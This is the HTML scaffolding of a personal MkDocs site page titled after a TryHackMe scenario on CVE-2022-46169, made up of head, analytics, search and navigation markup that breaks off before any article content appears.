<!DOCTYPE html><html lang="en" class="no-js"><head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
      
      
        
      
      
      <link rel="icon" href="../../../../assets/attachments/favicon.ico">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
    
    
      
        <title>One of:TryHackMe:Scenarios:CVE-2022-46169 - Arman Riazi</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/main.484c7ddc.min.css">
      
        
        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.ab4e12ef.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../../assets/css/mkdocs-extra.css">
    
    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      
  


  
  

<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-ZE57CFGDDV"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-ZE57CFGDDV",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-ZE57CFGDDV",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
  
    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
  

    
    
  <link href="../../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
            html.glightbox-open { overflow: initial; height: 100%; }
            .gslide-title { margin-top: 0px; user-select: text; }
            .gslide-desc { color: #666; user-select: text; }
            .gslide-image img { background: white; }
            .gscrollbar-fixer { padding-right: 15px; }
            .gdesc-inner { font-size: 0.75rem; }
            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
        </style></head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="purple">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#one-oftryhackmescenarioscve-2022-46169" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="https://armanriazi.github.io/" title="Arman Riazi" class="md-header__button md-logo" aria-label="Arman Riazi" data-md-component="logo">
      
  <img src="../../../../assets/attachments/me.png" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Arman Riazi
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              One of:TryHackMe:Scenarios:CVE-2022-46169
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="purple" aria-label="Switch to dark mode" type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"></path></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="lime" aria-label="Switch to light mode" type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"></path></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"></path></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
      <div class="md-header__source">
        <a href="https://github.com/armanriazi/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"></path></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
    
      
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../.." class="md-tabs__link">
          
  
  
    
  
  Home

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../achievements/" class="md-tabs__link">
          
  
  
    
  
  Achievements

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../public/" class="md-tabs__link">
          
  
  
    
  
  Walk-through

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../services/" class="md-tabs__link">
          
  
  
    
  
  Services

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../programming/Programming/" class="md-tabs__link">
          
  
  
    
  
  Programming

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../Cybersecurity/" class="md-tabs__link">
          
  
  
    
  
  Cybersecurity

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../blockchain/Blockchain/" class="md-tabs__link">
          
  
  
    
  
  Blockchain

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../publications/" class="md-tabs__link">
          
  
  
    
  
  Publications

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../recommedations/" class="md-tabs__link">
          
  
  
    
  
  Recommedations

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../tags/" class="md-tabs__link">
          
  
  
    
  
  Tags

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../forms/" class="md-tabs__link">
          
  
  
    
  
  Forms

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../links/" class="md-tabs__link">
          
  
  
    
  
  Links

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../about/" class="md-tabs__link">
          
  
  
    
  
  About

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
    
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


  

<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="https://armanriazi.github.io/" title="Arman Riazi" class="md-nav__button md-logo" aria-label="Arman Riazi" data-md-component="logo">
      
  <img src="../../../../assets/attachments/me.png" alt="logo">

    </a>
    Arman Riazi
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/armanriazi/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"></path></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    
    
      
        
          
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_1">
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../.." class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    Home
  

    
  </span>
  
  

            </a>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1">
            <span class="md-nav__icon md-icon"></span>
            
  
    Home
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2">
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Achievements
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    Achievements
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../achievements/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Achievements
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3">
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Walk-through
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    Walk-through
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../public/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Walk-through
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4">
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Services
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            
  
    Services
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../services/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Services
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5">
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Programming
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            
  
    Programming
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../programming/Programming/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Programming
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6">
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Cybersecurity
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            
  
    Cybersecurity
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Cybersecurity/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Cybersecurity
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7">
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Blockchain
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            
  
    Blockchain
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../blockchain/Blockchain/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Blockchain
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8">
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Publications
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            
  
    Publications
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../publications/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Publications
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_9">
        
          
          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Recommedations
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9">
            <span class="md-nav__icon md-icon"></span>
            
  
    Recommedations
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../recommedations/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Recommedations
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_10">
        
          
          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Tags
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_10">
            <span class="md-nav__icon md-icon"></span>
            
  
    Tags
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../tags/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Tags
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_11">
        
          
          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Forms
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11">
            <span class="md-nav__icon md-icon"></span>
            
  
    Forms
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../../forms/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Forms
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_12">
        
          
          <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Links
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_12">
            <span class="md-nav__icon md-icon"></span>
            
  
    Links
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
